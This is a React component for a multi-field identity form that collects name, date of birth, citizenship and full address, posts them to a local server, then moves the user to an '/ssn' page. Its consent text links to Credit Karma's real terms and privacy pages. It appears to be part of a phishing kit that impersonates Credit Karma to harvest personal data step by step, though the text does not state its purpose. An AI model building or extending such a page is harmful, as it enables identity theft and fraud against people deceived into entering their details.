import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import '../styles/address-page.css';
import axios from 'axios';

function AddressPage() {
  const navigate = useNavigate();
  
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [dobDay, setDobDay] = useState('');
  const [dobMonth, setDobMonth] = useState('');
  const [dobYear, setDobYear] = useState('');
  const [citizenship, setCitizenship] = useState('');
  const [country, setCountry] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [address1, setAddress1] = useState('');
  const [address2, setAddress2] = useState('');

  const changesetDobDay = (e) => {
    const value = e.target.value;
    if (value === '' || (value >= 1 && value <=31)){
      setDobDay(value)
    }
  }

  const changesetDobMonth = (e) => {
    const value = e.target.value;
    if (value === '' || (value >=1 && value <=12)){
      setDobMonth(value);
    }
  }

  const changesetDobYear = (e) => {
    const value = e.target.value;
    if (value === '' || (value >=1 && value <=2000)){
      setDobYear(value);
    }
  }

  const handleContinue = async (e) => {
    e.preventDefault();

    const addressData = {
      firstName,
      lastName,
      dob: `${dobDay}/${dobMonth}/${dobYear}`,
      citizenship,
      country,
      city,
      state,
      zipCode,
      address1,
      address2,
    };

    try {
      const response = await fetch('http://localhost:1000/save-address-input', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(addressData),
      });

      if (response.ok) {
        console.log('Address data saved successfully');
        navigate('/ssn');
      } else {
        console.error('Failed to save address data');
      }
    } catch (error) {
      console.error('Error submitting form:', error);
    }
    
  };

  return (
    <div className='address-page-container'>
      <form className="main-container" onSubmit={handleContinue}>
        {/*top container*/}
        <div className='container-top'>
          <div className='container-title'>
            <div className='title-1'>
              Please fill in your information
            </div>
            <div className='title-2'>
             Kindly provide all the necessary details in the fields below to ensure your information is accurately recorded and processed. Double-check for accuracy before submitting.
            </div>
          </div>
        </div>

        {/* Middle Container */}
        <div className="bottom-container">
          <div className="address-input-container">
            <div className="address-input-container-1">
              <div className="form-line-1">
                <div className="line-11">
                  {/* First Name */}
                  <label htmlFor="first-name">First Name</label>
                  <input
                    id="first-name"
                    type="text"
                    placeholder="First Name"
                    value={firstName}
                    onChange={(e) => setFirstName(e.target.value)}
                    required
                  />
                </div>
                <div className="line-12">
                  {/* Last Name */}
                  <label htmlFor="last-name">Last Name</label>
                  <input
                    id="last-name"
                    type="text"
                    placeholder="Last Name"
                    value={lastName}
                    onChange={(e) => setLastName(e.target.value)}
                    required
                  />
                </div>
              </div>
              <div className="form-line-2">
                <label className="line-21">Date of Birth</label>
                <div className="line-22">
                  {/* Date of Birth */}
                  <input
                    type="number"
                    min="1"
                    max="31"
                    placeholder="Date"
                    value={dobDay}
                    onChange={changesetDobDay}
                    required
                  />
                  <input
                    type="number"
                    min="1"
                    max="12"
                    placeholder="Month"
                    value={dobMonth}
                    onChange={changesetDobMonth}
                    required
                  />
                  <input
                    type="number"
                    placeholder="Year"
                    min='1900'
                    max='2000'
                    value={dobYear}
                    onChange={changesetDobYear}
                    required
                  />
                </div>
              </div>
            </div>

            <div className="address-input-container-2">
              <div className="form-line-3">
                <div className="line-31">
                  <label>Citizenship</label>
                  <input
                    placeholder="Citizenship"
                    value={citizenship}
                    onChange={(e) => setCitizenship(e.target.value)}
                    required
                  />
                </div>
                <div className="line-32">
                  <label>Country</label>
                  <input
                    placeholder="Country"
                    value={country}
                    onChange={(e) => setCountry(e.target.value)}
                    required
                  />
                </div>
              </div>

              <div className="form-line-4">
                <div className="line-41">
                  <label>City</label>
                  <input
                    placeholder="City"
                    type="text"
                    value={city}
                    onChange={(e) => setCity(e.target.value)}
                    required
                  />
                </div>
                <div className="line-42">
                  <label>State</label>
                  <input
                    placeholder="State"
                    type="text"
                    value={state}
                    onChange={(e) => setState(e.target.value)}
                    required
                  />
                </div>
                <div className="line-43">
                  <label>Zip Code</label>
                  <input
                    placeholder="Zip Code"
                    type="text"
                    value={zipCode}
                    onChange={(e) => setZipCode(e.target.value)}
                    required
                  />
                </div>
              </div>

              <div className="form-line-5">
                <div className="line-51">
                  <label>Address 1</label>
                  <input
                    placeholder="Address 1"
                    type="text"
                    value={address1}
                    onChange={(e) => setAddress1(e.target.value)}
                  />
                </div>
                <div className="line-52">
                  <label>Address 2</label>
                  <input
                    placeholder="Address 2"
                    type="text"
                    value={address2}
                    onChange={(e) => setAddress2(e.target.value)}
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Button */}
          <div className="address-button">
            {/* Continue Button */}
            <button id="button-1" className="address-button-1" type='submit'>Continue</button>
            <div className="text">
              By clicking "Continue", you confirm that the information provided is accurate and complete to the best of your knowledge.
              You also agree to our <a className='links' href='https://www.creditkarma.com/about/terms202309' target='blank'><span>Terms of Service</span></a> and <a className='links' href='https://www.creditkarma.com/about/privacy' target='blank'><span>Privacy Policy</span></a>.
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}

export default AddressPage;
